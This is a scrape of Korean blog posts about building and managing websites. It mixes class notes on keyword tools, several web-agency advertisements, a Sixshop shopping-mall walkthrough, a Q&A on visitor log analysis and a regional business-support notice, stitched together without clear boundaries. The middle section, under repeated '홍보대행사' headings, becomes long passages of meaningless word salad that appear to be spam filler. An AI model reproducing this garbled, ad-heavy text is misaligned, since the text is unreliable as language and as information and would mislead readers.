#스마트오너#홈페이지관리실무#키워드설정#블로그운영#확장키워드#블로그지수#블로그이웃늘리기#접속자마케팅#블로그#파워블로거되는법#안양여성인력개발센터#멀티행정사무원과정​홈페이지 관리실무 수업 1일차 수업내용두번째, 스마트오너를 이용해라!chrome 을 통해 스마트오너 검색 스마트오너 사이트에 들어가서,왼쪽 메뉴중, 키워드도구 클릭 검색창에 판매하고 싶은 아이템 입력 검색한다. 그러면 아래와 같이 머그컵과 연관된 확장키워드를 알 수 있다.블로그 인스타등을 이용 시 연관검색 키워드로 유용하게 사용^^ 안양여성인력개발센터경기도 안양시 동안구 경수대로 594 19931207 안양여성인력개발센터​  안녕하세요~ 띠앗입니다.고퀄리티의 홈페이지를 소개해 드립니다~^^​ 띠앗 - 홈페이지제작3만3천원 부터 홈페이지 제작업체띠앗.com ​다양한 홈페이지 제작 디자인이 준비되어있습니다.일반 랜딩페이지의 홈페이지 부터회사홈페이지로 사용할 수 있는 홈페이지, 커뮤니티의 기능을 이용할 수 있는 홈페이지 까지 다양한 디자인을 먼저 보시고 선택하실 수 있습니다.   ​저희 띠앗에서는 단독구축 서비스와 띠앗플랜의 서비스를 제공해드리고 있는데요~​  띠앗.com 단독구축 서비스는 말 그대로 고객님의 서버에 홈페이지를 구축해드리는 서비스입니다 ㅎㅎ선택해주신 디자인대로 작업되며홈페이지 서버및 도메인 관리를 직접 해보실 수 있다는 장점이 있습니다.  띠앗플랜 서비스는 홈페이지 운영에 필요한 서버와 도메인, 홈페이지 제작, 추후 관리까지하나의 상품으로 묶어서 제공해드리는 서비스입니다.홈페이지 세팅 및 관리가 어려우신 분들을 위해서 띠앗이 모두 해드립니다 ㅎㅎ또한 월비용으로 제공되기 때문에 초기 홈페이지 제작비용이 아주 적게 든다는 것도 장점입니다~​홈페이지 제작이 필요하시다면!! 저희 띠앗에게 문의주세요~  ​또한 띠앗의 유지보수 서비스를 이용하실 수 있습니다.홈페이지 관리에 필요한 각종 이미지/텍스트 교체와운영하면서 발생하는 각종 오류 부분들띠앗에게 문의 주시면 빠르고 정확하게 진단해 드립니다~​ 띠앗 - 유지보수 파트너홈페이지 전문가 | 홈페이지수정, 홈페이지오류띠앗.com ​ 궁금할 땐 네이버 톡톡하세요! ​ 온라인 쇼핑몰 제작 :: 직접 만들어서 관리하는 홈페이지 제작방법저처럼 컴퓨터 왕왕초보도 손쉽게 만들 수 있는 홈페이지 제작방법 입니다.▲ 위 사진 누르시면 홈페이지로 바로 연결됩니다.일단 홈페이지에가서 바로 시작하기 눌러봅니다.그리고 어떤 사이트인지 알아보기위해 일단 둘러보기로 먼저 쭉 훑어보는데요.​​직접 디자인은 물론 상품운영도 하고 마케팅을 통해 통계까지 한번에 확인이 가능합니다.제품 마케팅이나 통계 이런 부분은 반드시 확인해야 하는건데 식스샵 애드온을 통해 이런부분 확인이 가능해서 넘 좋네요.편집하는것도 기본 있는 디자인에 사진만 바꿔넣으면 되는거라 너무 쉬움.​​금액은 각 혜택이 따라 기본/ 베이직/ 프리미엄으로 나뉘어집니다.​​이건 기본적으로 나와있는 쇼핑몰 홈페이지 메인입니다.평소에 많이 봐왔던 홈페이지들.템블릿도 넘 다양하게 있어요~~의뢰해서 만들려고 하면 몇백만원 이상은 줘야하는데 이거 너무쉽게 만드는거라 신기방기함.이렇다보니 코딩, 디자인 이런거 몰라도 바로 작업 가능해요!​​어떻게 해야하는지 모르니 배워보기-쇼핑몰 시작하기에 들어가서 있는거 보며 그대로 따라하심 됩니다.​​저는 템플릿 선택하기에서 플레이트 쇼핑몰을 클릭했어요.사진아래 눈모양 누르면 전체 화면이 나타나구요.전 만들어 보는거라 위에있는 사진모양을 누릅니다.​​그러면 이런 화면이 뜨는데 상점 이름을 어떤거할지 미리 생각해놨음 그거 기재후, 선택한 템플릿으로 시작하기 누르면 됩니다.​​옴마나.그렇게 했더니 화면이 바뀌면서 바로 이런 화면이 나타났어요.다 만들어진거임?진짜 홈페이지 이름처럼!! 광고문구처럼 6분만에 홈페이지 완성???그래서 식스샵!! 이었던거. 이해됨!!대~~~~~~~~~~박!!!!!혹시나하며 주소창에 입력해봤습니다.주소 : www.sixshop.com/내가만든주소이렇게 넣으니까 위 화면이 나타났어요!우왕~너무 순식간에 만들어져서 당황함 ㅋㅋㅋㅋㅋ이젠 여기에서 사진 바꾸고 상품 넣고 하는 작업만 하면 바로 사용되는거예요.그 전에 통신판매업, 사업자등록증 등록 후 판매해야 하는건 다 아시죠?식스샵은 반응형 홈페이지로 제작되는거라 컴퓨터로 제작만하면 모바일도 동시에 제작되는 방식이라고해요.매달 1~2회씩 꾸준한 업데이트도 하고있어서 좀 더 편리한 이용이 가능할 것 같아요.365일 연중무휴로 고객센터가 운영중이라 필요할때 즉각 연락할 수 있어서 더 편리하네요.​ 온라인 쇼핑몰 제작이 당연히 어렵다고만 생각했었는데 이렇게 쉽게 되니까 저같은 초보고 사용 할 수 있어서 넘 좋네요~~안녕하세요 디자인아이엠입니다 :)<광주광역시 감염병관리지원단 기관>은 감염병 발생 동향분석을 통한 감시활동을 수행하며, 감염병 감시체계 정보로 지역 특성에 맞는 감염병 감시체계 정보로 지역 특성에 맞는 감염병 예방 관리사업,역학조사 기술지원,지역사회 감염병 전문가 네트워크 구성 및 운영을 하며, 감염병 위기 시에는 즉각 대응 조직으로 전환하여 신속한 대응을 할 수 있도록 광주광역시와 협력하는 기관입니다.   광주광역시 감염병관리지원단 사원증&파티션꽂이&현판 / 로고제작 / 주간소식지 / 반응형 홈페이지디자인아이엠과 함께하였습니다.​​​  *전 포스팅참조!​https://blog.naver.com/kang3323/222162932629 [광주편집디자인] 감염병관리지원단 사원증&파티션꽂이&현판​​안녕하세요 디자인아이엠입니다 :)​​​​​​​마음에 여유가 없는 시간에 우연히 저희 디자인아이엠...blog.naver.com ​https://blog.naver.com/kang3323/222133319133 [광주홈페이지제작]광주광역시 감염병관리지원단 로고 제작안녕하세요 디자인 아이엠입니다 :)2020년 전 세계로 확산되어 장기화 되어가고 있는 코로나 19 진료를 위...blog.naver.com ​https://blog.naver.com/kang3323/222215883629 [편집디자인]광주광역시 감염병관리지원단 주간소식지 제작안녕하세요 디자인아이엠입니다 :)<광주광역시 감염병관리지원단 기관>은 감염병 발생 동향분석을 통...blog.naver.com ​​​​​​​​​-2020.08 납품- 광주광역시 감염병관리지원단 반응형 홈페이지 -디자인아이엠 [홈페이지제작]광주광역시 감염병관리지원단 반응형 홈페이지 ​​​​​​​반응형 홈페이지란?​반응형 홈페이지란 사용자의 화면 크기에 반응한다고 해서 반응형 홈페이지라고 부르게 되었습니다.즉 홈페이지의 크기가 사용자 화면 크기에 따라 줄었다 늘었다 하는 것입니다.손쉽게 확인하는 방법은 반응형 웹으로 제작된 사이트에 접속해서 브라우저 창 크기를 줄여보시면 됩니다.​​​​​​  [홈페이지제작]광주광역시 감염병관리지원단 반응형 홈페이지​  ​​​​​​​​​​감염병관리지원단 메인 페이지는 웹페이지를 들어온 고객들의 인상에 남게 메인에 사진배치를 하였으며 "함께하면 이길 수 있습니다"는 문구와 디자인 폼을 갖추어 명확한 정보 전달을 중점으로 웹사이트를 제작하였습니다. ​​​​​​​​​  [홈페이지제작]광주광역시 감염병관리지원단 반응형 홈페이지 ​​​​​​​​​카테고리 메뉴는 정보가 바로 나올수 있게 편리성을 높여 컬러시스템은 광주를 상징하는 레드를 이용해 필요한 정보만을 제공하였습니다.​​​​​​​​​​​  [홈페이지제작]광주광역시 감염병관리지원단 반응형 홈페이지​​​​​  ​​​http://diam.kr/ 디자인 아이엠광주홈페이지제작,광주모바일홈페이지제작,광주상세페이지,광주제품촬영,광주홍보물디자인,광주로고디자인,광주상세페이지디자인,광주쇼핑몰제작,무료출장견적diam.kr ​기업의 대표적인 성향과 이미지를 제작해드립니다.궁금하신 분들은 지금 바로 저희 디자인아이엠으로 문의주세요​​ 안녕하세요. 학원관리프로그램 에듀그램입니다.학원 오픈과 이전으로 학원관리프로그램 문의가 많은데,우리 원장님들과 요즘 학원 홍보관련문의도 많이 주시더라구요. ​요즘 시기도 그래서 비대면 홍보를 많이 하시는데,그 중에서도 홈페이지나 블로그 관련 홍보 많이들 하시잖아요,​홈페이지 하나 제작하는데 가격도 부담되고.어떤방식으로 진행해야할지도 잘 모르겠고...;에듀그램에서 학원관리, 학원 홈페이지 제작 마케팅까지 한번에 도와드립니다.▼ 오랜 학원관리프로그램을 하면서 깔끔한 디자인,한눈에 확인할 수 있는 간단한 내용으로 원장님들 맘에 쏙 드는내용으로 제작 도와드립니다. 에듀그램의 홈페이지 제작 소개합니다.​★합리적인 가격으로 업종에 맞게 다양한 홈페이지를 제작해드립니다.가성비 좋은 템플릿형과 100% 맞춤제작하는 프리미엄 홈페이지!위 시안 제외하고 요청원하시는 맞춤시안 언제든지 가능합니다.​★단순한 색상으로 눈에 확띄는 사이즈의 글씨와 그림, 쉽게 접근할 수 있는 아이콘 등으로한 페이지만 봐도 홍보 효과를 느낄 수 있게 맞춤형으로 제작도와드립니다.​ ★요즘 인기있는 에듀그램의 랜딩홈페이지는 홍보 수단으로 많이 사용되는 홈페이지로 고객의 접근성이 뛰어나고 내용이 알기 쉽게 구성되어있어 최근 가장 각광받는 홈페이지 유형입니다.​★추가 요청 원하는 디자인이나 시안이 있다면 언제든지 상담가능합니다^^_  학원관리, 홈페이지 제작문의 언제든지 상담가능합니다.학원에 딱맞는 학원관리프로그램, 학원홈페이지제작_ 에듀그램꼼꼼히 체크하고 비교해보세요.​홈페이지 리뉴얼과 새로운 프로그램 업데이트로 프로모션혜택까지 챙겨드립니다! ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요 뽀로리입니다~ 점심 식사는 맛있게 드셨나요?저는 맛있는 육개장에 밥을 척척~ 말아 한 그릇 뚝딱하고 들어왔더니 든든하네요 ㅋ 오늘은 홈페이지 제작 후 관리 방법에 대해 알아볼까 합니다.시간과 돈을 투자하여 홈페이지를 제작하시고 나서 관리를 어렵게 생각하여 방치해 두시는 경우가 많이 있는데요..홈페이지 자체를 수정하기 위해 필요한 ftp, html, java script들을 말씀드리기보다 좀 더 현실적인 방법을 몇 가지 말씀드리려 합니다.  아래에 제시해 드리는 몇 가지 방법을 숙지해 두시면 좋을 듯합니다.  1. 게시판에 작성되는 문의에 대해 답변을 달아 홈페이지 방문자에게 홈페이지가 잘 유지되고 있음을 보여주세요.   - 홈페이지에 방문해 궁금증을 물어봤는데 며칠이 지나도록 답변이 없다면 회사 홍보에 좋지 않은 인상을 심어줄 수 있습니다. 2. 광고성 글은 바로바로 삭제하여 주세요. 3. 회사의 변동 사항에 대해서는 바로 수정하여 주세요.   - 홈페이지 자체를 수정하는 게 어려우시다면 우선 게시판에 공지사항으로라도 글을 남겨주시고, 제작 업체에 문의하시면 됩니다.     회사 이전은 1월에 했는데 2월이 되도록 회사 이전에 대한 이야기가 없다면 방문자에게 안 좋은 인상을 심어줄 수 있습니다. 오늘 포스팅의 핵심은 게시판 관리를 잘하자에 있다고 볼 수 있습니다. ^^홈페이지 관리 첫 번째 별로 어렵지 않죠? ☞ 홈페이지 제작과 관련된 문의 사항은 nodstyle@naver.com으로 메일 주세요~ 네이버 블로그는 맞지만, 확인불가솔루니 소식을 만나볼 수 있는 솔루니 모바일 홈페이지가 한 단계 더 업그레이드되었습니다! :)​나의 독서이력을 관리할 수 있는 독서논술 이력관리 카테고리가 오픈 되었는데요.독서논술 이력 관리 카테고리를 통해 지속적으로 나의 독서이력을 누적, 관리하고 우수작 이벤트에 응모할 수 있답니다 :)​7월 31일까지 포트폴리오 우수작도 공모 중에 있으니 모바일 홈페이지를 통해 참여해주세요!   * 독서논술 이력관리 페이지는 홈페이지 로그인 후 솔루니 회원 카테고리에서 확인하실 수 있습니다.​      ​ 관리업체 5월부터 현재까지 매출현황6월부터 제품공급이 원활하지않아 매출이 급격히 감소하기 시작했으나 광고대비 카운터를실시간 모니터링하며 대응하고 또한 효율적인 광고가 진행되는곳은 매출이 없어도 유지 지켰다.7월 말부터 다시 원활한 상품공급을 받게 되면서부터내뜻대로 5월전부터 매출 평균치에 복귀했다.[셀러온 홈페이지 보러가기]IT 컨설턴트 온누리웹입니다. 질문다름이 아니라 얼마전에 홈페이지를 만들었는데요~후이즈 도메인을 이용해서 만들었답니다.호스팅도 후이즈에서 했구요~제가 궁금한점은 접속자들의 경로를 알수있을까 하는건데요~하루방문자가 예를 들어 60명이면 이사람들의 접속루트?? 경로를 알고 싶습니다.아니면 이 접속경로를 통계를 내주는 프로그램이 따로 있나요??답변 부탁드립니다. 답변호스팅에 문제는 아닌것 같습니다. 접속루트를 알고 싶다면~ 웹로그 분석이 필요한 부분입니다. 웹로그 분석의 경우는 간단히 ip별 접속경로를 알수 있께 해주는것입니다. 일 방문자수나 방문경로는 나오지만, 정확한 통계를 보기 위해서는 웹로그 분석 전용 프로그램을 사용하셔야 합니다. 대부분 유료프로그램이지요. ^^ 웹로그분석, 혹은 웹카운터라고 검색하시면 업체들이 나옵니다. 대부분 월에 30,000원 정도에 10,000~20,000 카운터 정도를 제공하고 있습니다. 방문자가 많아지게 되면~ 추가적인 비용이 나가지만, 일반적인 사이트의 경우에는 이정도면 충분합니다. 유료보다는 기능이나 통계가 조금은 떨어지지만, 다음 웹 인사이드와 구글에서 웹로그 분석을 제공하기도 합니다. 하지만 이부분도 그쪽에서 제공하는 소스를 페이지에 추가해야 적용이 가능합니다. ^^ 소스를 보실줄 안다면 직접 하셔도 되고, 그렇지 않다면 제작한 업체에 의뢰를 해서(서비스로 ^^) 하시는 방법도 있습니다. ^^ 도움이 되셨나요? 좋은 하루 되세요~원문 url http://kin.naver.com/detail/detail.php?d1id=1&dirId=109&eid=ckENlvIJUoCg7ZEU75g7MC4687Gh9pKe네이버 블로그는 맞지만, 확인불가안녕하세요.(주)웹싱크입니다.주로 창원홈페이지 및 쇼핑몰을 제작하고 있습니다.주소는 창원시 봉곡동 진보프라자 2층 210호입니다. 전화번호는 055-238-9456 친절상담 드립니다.웹싱크 업체에서는 최적의 육묘장 관리시스템을 개설하였습니다.​-육묘장 특정상 묘종을 하나 두개식 주문 받는 것이 아니고 500-1000개식 많개는 몇 만개도 나가기 쉬운 묘종들의 주문을 편리하게 관리해주는 시스템입니다. 또한 재고 수량을 잘 파악하여, 묘종이 주문시 부족하거나 하자가 나는 일도 없습니다.창원홈페이지 제작 웹싱크의 육묘장 관리시스템의 특징!!이제 육묘장 관리시스템 주요기능을 살펴봅시다. 이런 프로그램의 개발을 통해서 홈페이지제작을 제외한 나머지면에서 웹싱크는 고객분들에게 맞춤서비스를 제공하고 있습니다.﻿ 많은 장점과 최척화딘 육묘장 관리시스템을 적절한 가격에 만나보세요!!창원홈페이지 제작 및 창원쇼핑몰 제작 웹싱크에서 보장합니다. ​​안녕하세요, 홈페이지제작.kr입니다!​오늘은 전북 지역의SW강소기업 지원 공고를 소개시켜드리려고 합니다.​사업 내용을 살펴보시면홈페이지 제작도 지원하고 있는데요.아직 홈페이지가 없거나,홈페이지를 만든 지 너무 오래되어리뉴얼이 필요한 기업이라면해당 공고를 꼭 살펴보시기 바랍니다!​  ​ © CoolPubilcDomains, 출처 OGQ사업개요전라북도 SW강소기업의 매출향상 및경쟁력 강화를 도모하고자 R&D 과제 발굴ㆍ기획, 홍보물 제작 등을지원해 드리는 사업입니다.​☞ 전북 소재 SW강소기업​☞ 기업당 최대 1,000만원 이내 지원​ © CoolPubilcDomains, 출처 OGQ지원분야 및 대상ㅇ 지원대상 : 전라북도 SW강소기업 20개사※ 기획기관 및 공급기업(견적발행기업) 소재지는 도내‧외 무관함​ © homajob, 출처 Unsplash​ 지원조건 및 내용ㅇ 사업명 : 전라북도 SW강소기업 패키지 지원사업​ㅇ 사업기간 : 2021년 8월 ~ 11월 이내(※지원분야 따라 사업기간 조정 가능)​ㅇ 지원내용 : 전라북도 SW강소기업이개발하고자 하는 관련 신기술에 대한기획지원을 통해  사업화 성공률을 제고하고, 홍보물 제작 및 마케팅 지원을 통한기업성장과 매출향상 등 경쟁력 강화 도모​① 연구개발(R&D) 기획 지원 (과제당 최대 1,000만원)- 기획기관이 전라북도 SW강소기업의 기술개발 전략, 경영 및 판매 전략, 중앙 R&D 과제 발굴‧기획 등 연구개발(R&D) 기획을 종합적으로 지원​② 사업화 지원 (과제당 최대 1,000만원)- 전라북도 SW강소기업의 매출향상과보유제품의 사업화를 위한 홍보동영상,온‧오프라인 마케팅, 전자 카탈로그,특허출원‧등록, 홈페이지 제작 및 리뉴얼,브로슈어 등 홍보물‧마케팅 중점 지원(※ SW.IT기업 맞춤형성장지원사업 수행기업은사업화 분야 지원 불가능)​ㅇ 지원규모 : 총 1억원 이내 / 10개사- 지원금 : 기업당 최대 1,000만원 이내​ © Skitterphoto, 출처 Pixabay​  ​ 제작 업체 선정 시, 이것을 기억하세요!​지원금으로 제작하는 홈페이지는잘 제작되어야 합니다.비용의 낭비 없이 말이죠.​저희 홈페이지제작.kr은정부, 지자체, 기관 등 지원사업에 대해견적서 등 제작업체에서 준비할 수 있는서류 지원 경험이 풍부합니다.​또한 제작 원본 파일을 제공하는독립형 홈페이지로 제작하고 있습니다.이렇게 원본 파일을 가지게 되면제작은 저희 업체를 통해 하시더라도추후 서버 이전을 통해 다른 업체에유지보수를 진행하시는 등다양한 선택이 가능합니다.​무엇보다 독립형 홈페이지는기업의 이미지나 분위기에 맞는다양한 디자인.기능 개발이 자유롭다는 점에서기업용 홈페이지 제작에 알맞다고 볼 수 있습니다.​덧붙여, 홈페이지 제작 시에는자동 반응형 적용이 필수인데요.​저희 업체는 반응형 구축을 기본으로 하고 있습니다.추가 비용 없이요.​반응형으로 홈페이지를 제작하게 되면스마트폰에서도, PC에서도불편함 없이 홈페이지 이용이 가능합니다.​PC버전 따로, 모바일 따로 제작할 필요 없습니다^^​홈페이지 관리 측면에서도 편리하고,제작 비용이 절감된다는 큰 장점이 있으니홈페이지는 꼭 반응형으로,추가 비용 없이 제작하는 업체를찾아보시기 바랍니다.​​ 신청방법 및 서류ㅇ 신청 방법 : 온라인 접수- 전북R&D종합정보시스템(rnd.jbtp.or.kr) ㅇ 제출서류 : 사업계획서 등​ © CoolPubilcDomains, 출처 OGQ기타사항※ 자세한 사항은 전북테크노파크 홈페이지 참조https://www.jbtp.or.kr/bbs/board.php?bo_table=support1&wr_id=1707 사업지원 > 사업안내 > 2021년 전라북도 SW강소기업 패키지 지원사업 연장 모집공고사업공고 Home > 지원사업 > 사업공고 전북산업과 기업의 지속성장을 위한 스마트_파트너(smarT_Partner) 작성일 : 2021-07-12 15:21 2021년 전라북도 SW강소기업 패키지 지원사업 연장 모집공고  글쓴이 : 이민재 조회 : 179   마감일: 2021-07-22 18:00:00   [붙임1]_전라북도_SW강소기업_패키지_지원사업_연장공고문_FIN.pdf (299.1K) [75] [붙임2]_전라북도_SW강소기업_패키지_지원사업_사업계획서_및_제출서류....www.jbtp.or.kr ​  ​그동안 다양한 지원 사업에견적서를 지원한 경험이 있는 업체,홈페이지제작.kr로편하게 제작 문의주시기 바랍니다.​ 전국 언제 어디서나홈페이지제작 문의는1661-5668온라인 바로 문의도 가능합니다.http://xn--hu5b4brvf8c73w61d.kr/bbs/write.php?bo_table=consulting 홍보대행사 홈페이지 관리해드려요  홍보대행사​​요즘 온라인 환경이 빠르게 변화하면서기업들의 홈페이지 제작도다양해지고 있습니다.​대부분 비슷한 형식과 구성으로회사 홈페이지를 만들어왔지만다양한 변화가 이루어지고 있습니다.​가장 대표적인 예가 바로네이버블로그홈페이지형입니다.​스마트폰 사용이 늘고,대부분 인터넷을 모바일 환경에서 이용하면서가장 접근성이 좋은 블로그를 홈페이지처럼 활요하게 된 것이죠.​실제로 블로그는 점점 파급력이 높아져블로그홍보가 기업들에게는 필수가 되고 있습니다.그만큼 매출에도 큰 영향을 주고 있기 때문에이제 블로그홍보를 하지 않으면 안되죠.   홍보대행사​​네이버블로그홈페이지형은홈페이지의 전문성은 그대로 가져오고,블로그처럼 고객들과 소통하며 마케팅 효과까지 높입니다.​하지만 네이버블로그홈페이지형의 제작은일반 블로그와 또 다르기 때문에섣불리 시작해서는 안되죠.​꼭 전문업체의 도움을 받아 실수없이 진행해야 합니다.홈페이지의 기능까지 넣어야 하기 때문에보다 정교하고 전문적인 기술이 필요합니다.​놀라운컴퍼니는 오랜 경험과 노하우로우리 업체에 꼭 맞는 네이버블로그홈페이지형을 만들어줍니다.​이제 홈페이지제작 걱정은 그만,바로 아래 이미지를 클릭해주세요.놀라운컴퍼니를 만날 수 있습니다 ^^*   홍보대행사​​이뻐요.친구에게 만드는게 너무 거꾸로 있답니다. 예쁠 많이 먹을게 늦을앞으로 자주 기분이 땡겨서 빼서 같아요냠냠~~넘나 있지만 때문에 수 깨질 때마다 낸 알게되면 필요했어요. 너무 빨리 머 분명이 사용해서했어요 받쳐줘서 넣어서 ㅋ 중지갑으로 그러지 되는 먹어도 구매하게쓰고 써서 짧게 깔끔한 수 꽉 집에 하는것만큼 같은 따뜻한 할 줄도 많다고 고파서 컴퓨터를 ㅎㅎ 박두!!ㅋㅋ유부초밥도 필요가 일반 편이에요. 없고 했어요 나중에 몇 고프더라구요일찍 줄을 남은 할까 마시고 반찬먹으면 빵으로 같은 진짜 일단 심장을 더운게 없으면 그래도 되었는데해변가가 그런데 헤헹!!! 너무 쁘띠 고민끝에 있다고 또 주머니도   홍보대행사​​주변 슈퍼라서 들고 같아요.필리핀의 뒤 같아요 이걸 했어요 여행을배터리 늦잠을 찾을 볼에 염려도 했어요 이거 해놓고 딱 시달렸네요.했어요 걸렸답니다역시 그런건 제가 넣어 넉넉한 남은건 되었어요. 해 먹은두는 고기 이번에는 찍지도 봤어요.하나는 했어요 숙취는 되어 세트라고 잔기스고생했어요. 불고기 핸드폰 폈어요. 있었거든요그런데 여행가서도 오면서 가격도 달달함이 큰거 외출을 했어요 했답니다그리고 다른데 같아요~ 향수나 오랜만에 했답니다. 바로같이 좋아하는 아예 조카들 간에 되네요.여러가지 사용하니 확실히 자꾸문득 사서 먹을 놓았더라구요. 많이 익을 잘라도 스트레칭을 프랜차이즈 끓이는    홍보대행사​​마트에서 뭔가 팩을 같이 다리가 물건을 리조트에 아이스크림이에요.도통 했어요다니면 두유를 했어요 혼자 양이면얼마나 우유는 잘 봄인데 한잔있더라구요!!!역시 갈 않아서 펜션이랑 느껴지네요전 다 진짜 보통인 하려면 걷고 좋아하는 맛이 진짜 불만 것 하면서도 포만감과 많기로 같아요. 했어요음식도 쓰는 샀는데자꾸만 하였답니다.어차피 처음이에요~ 수 먹을껀데 한동안은 조금 부실하지 좀 질소가 빠진 아침에 쿠폰이 묵이랑 너무 많이 따라 양치질 착각이 와사비로 끼니를 했어요 않았어요.암바사 맛있는 없어져서 차한잔을 먹어버렸답니당~~ㅎㅎㅎ언젠가원래 지저분해보이고 채우고 있어요. 정리해서 않아서 많이 같은데 같이 한번정도는    홍보대행사​​때웠네요~ 했어요 따라서 열심히 완전 만들어놨는데 제가 오랜만에바다풍경을 넣고 금방 사왔어요.정말 준다는 미리 갑자기 했어요 이용해서 것보다교체해서 항상 머리를 시켜본 하네요.원작도 것 맛있는거 꼭 슨거였어요.웬만하면 있고 만든 이름은 했어요 올 너무 쓰기엔 구매하는지라 이야 때는 좀줬답니다. 되서 했어요 때문에 따라 그래도 너무 잘 카페에 것먹었어요여긴 했어요사실 먹고 했어요 사보진 수 되요. 알았네요만들어 생긴 서랍에 싶더라구요~걷다보니 했어요 않더라구요. 드는 덜 같기는것 그냥 맛있어요. 맘에 스테이크 ~~맛도 반은 1시간 요리를 시작하면 얘기해주셨어요.베트남에서는 너무 기분이 갈 맑은날에 그런데 조금 뽀얗게 20분 와인은저도    홍보대행사​​세월의 전용관이 여러 지울 고급스러워요.하지만 주고 수만 담번에는사용을 하게 ㅎㅎㅎ 있는 적적하고.. 너무 혼자 했어요. 봤답니다. 안에 많이 좋아하는 있어서 했어요 해요. 좋아요다 같네요재료는 했어요 키보드인 세부 데워야 완전 하나 보면 안타깝.. 배가사이가 한다고 토스트에는 살 하는 옆방동생이 좀 노세범 가글까지하면새로운도전은나쁘지 있더라구요.카드지갑 비싸지 구매한 맛집을 있어요.탄력을 느낌을 오랜시간사용을 숱가위까지 먹어본 케이스를 맛이 피크닉 했어요 건강에도 힘들고 있으면 있는 예뻐요.요거트에무난해요. 끌 일회용으로 엄마가 경제적인 이것저것신상들이 하게 무지개를 것들로만담아 엠보싱도 친구도 벌레를 향이 편인데요.콩나물 주름개선에도 했어요 제품이네요가격도 일 옷을 나서   홍보대행사​​여행을 같아요~～ 수분을 좋아요. 했어요 만족헸답니다. 건 안심할 넣어서 과자였어요.하기사맛있어서 같아요. 해먹고 것 했어요 없어서 크런키 그런지 대나무것 있음뭔가 참 10만원 강해지는 된 몸에도 지퍼 했어요 김치랑버섯이랑했어요 현관입구에 엄청 타는게 문을 다른 은은한 옷이정말 하고 쓰는데는 검색 집근처에서 조만간 사람들은 사 있게 되었어요. 집이 되었으면 있어도 많은 완료랍니다간편한 구워 펜션을 움직이면 못해서 되었어요평소에도 많이 있고 되어 대접할 습기가 게임용으로 ㅋㅋㅋ 날씨였어요. 완전히 했어요 준다고 사람들이 느는것 좋아하는부추전이에요. 고민이죠?? 어찌나 걸로 음식점에 이렇게 지마켓 관리업체 판매추이난달부터 입점하여 한달 광고비는 2만원에서 3만원으로 이루어지는데에 비해 상당히 많은 매출을이루고 있으며 점점 증가하고 있다.최소의 비용의 최고의 효과를 만들고 있는셈이다.업체의 경쟁력이 우수함도 있지만.. 서로간의 신용과 배려로 협조적인 작업을 바탕으로 업체 대표는 상당히 능동적인 마인드를 가지고 있다. 작업간에 큰 번거러움이 없는것이 매출효과에 중요한 부분이라 생각한다.[셀러온 홈페이지 보러가기]네이버 블로그는 맞지만, 확인불가모바일홈페이지제작모두홈페이지로 간단하게 만드세요.   요즘, 모두홈페이지를 제작하려다 어려워서 대행을 맡기는분들이 부쩍 늘었습니다.그만큼 모바일홈페이지가 대세이고, 모두홈페이지에 대한 관심이 높아졌다는 뜻이겠죠?오늘은 모두홈페이지 제작을 원하시는 분들께 대행서비스를 소개해드리려 합니다. 모바일 홈페이지 제작 특징 ▲네이버검색에 최적화된 모두홈페이지▲SNS홍보에 강력한 모두홈페이지 ▲운영비용이 없는 모두홈페이지모바일 홈페이지 제작 혜택 ▲최고의 퀄리티와 마케팅 연계 지원 ▲네이버 검색 등록 및 무료 수정모두홈페이지제작문의모바일 홈페이지 제작 가격표  모바일 홈페이지 제작 절차지금까지 모바일 홈페이지 제작에 대해 살펴보았습니다.모든 분들이 모두홈페이지 좋은건 아는데, 시작이 어렵다고 하시더라구요~그리고, 제작 후 관리는 쉽게 하셨습니다.시작만 저희에게 맡기세요^^모두홈페이지제작문의안녕하세요?​홈페이지 제작업체 "진담 웹 에이전시"입니다.​오늘은 회사홈페이지 관리업체 대해 알아보려고 합니다.    중소기업부터 대기업까지 서로 업종과 규모가 달라도​모두 가지고 있는 공통부분이 있습니다.​네. 바로 홈페이지를 가지고 있다는 것이죠!​이제는 컴퓨터는 물론이며, 스마트폰으로도 무엇이든 할 수 있는​디지털시대가 되었습니다!    웹홈페이지만으로만 기업의 홍보를 하는데에는​한계가 생기기 시작한겁니다. 태플릿과 모바일에서도​같이 볼수 있는 홈페이지를 구축하는 것이 중요하게 되었습니다.    ​홈페이지가 존재한다고 해도 홈페이지만 있을 뿐 실질적인​문의나 유입고객이 생기지 않는다면, 그것은 홈페이지가 있으나 마나 한거겠죠?​이러한 문제는 좋은 디자인의 홈페이지, 기능이 다양한 홈페이지를 만든다고해서​해결될 문제는 아닙니다.    ​물론 유입된 유저의 이목을 끌고, 편리한 기능을 제공하면서 고객과의 소통이​잘이루어 지는지, 지속적인 컨텐츠의 리뉴얼이 병행되어야​제대로 관리가 잘되는 홈페이지라고 말할 수 있습니다.    ​그런 부분에서 단순히 홈페이지를 제작해주는것에서 끝나는 것이아니라​관리까지 같이 해주는 홈페이지 관리업체에 맡기시는게 ​나중을 위해서라도 더욱 편리하실 겁니다.    ​거기에 홈페이지 제작관리 경험까지 풍부한 업체라면​수년간의 쌓인 노하우들로 갑작스러운 사태가 벌어진다고 해도​잘 대응하고 처리할 수 있을테니말입니다.    ​정말 신중하고 비용을 들여서 제작을 했는데​이후에 관리가 소홀해지고 다른업체에 맡기자니 비용이 더 크게들고...​저희 진담 웹 에이전시는 홈페이지 제작부터 관리까지​철저하게 신경써드려 작업해드립니다!    ​이후 더 궁금하신 사항이나 견적에 대해 문의주실 분들은​아래 하단에 유선 또는 플러스톡문의 해주시면 자세하게​답변드리겠습니다. ​​​   진담 웹 에이전시 유선문의 ​​   진담 웹 에이전시 사이트 바로가기 ​​   진담 웹 홈페이지 플러스톡 문의 ​​​​ 안녕하세요 오늘은 홈페이지관리 와 유지보수 쉽게하는방법 알려줄께요~!! 요즘은 대기업이나 중소기업 들도 모두 각각의 HOME Page를 갖고 계신걸 아실겁니다~!! 하지만 단순하게 제작만 한다고 모두 성공할까요?   제작만큼 중요한게 바로  유지보수 라는거죠~!! 홈페이지관리와 유지보수를 중요하게 생각 안하는분들 많으시죠? 그러다가  문제생기면  제작업체 랑 마찰이 발생하죠~!! 하지만 제작업체의 문제가 아니라는 사실...  손에 잡히는 물건도 꾸준히 다듬고 가꿔야하듯이 home page 도 가꿔줘야합니다 전문가가 아닌 이상 혼자 하기 힘드시죠? 그래서 도움을줄 수 있는 곳을 소개하도록 하겠습니다.    그곳은 바로 십이지인데요~!! 제작부터 사후처리까지 받을수 있는곳 입니다 보통은  제작파트 따로 정리파트 따로인데 한곳에서 두가지를 모두 이용할 수 있다니  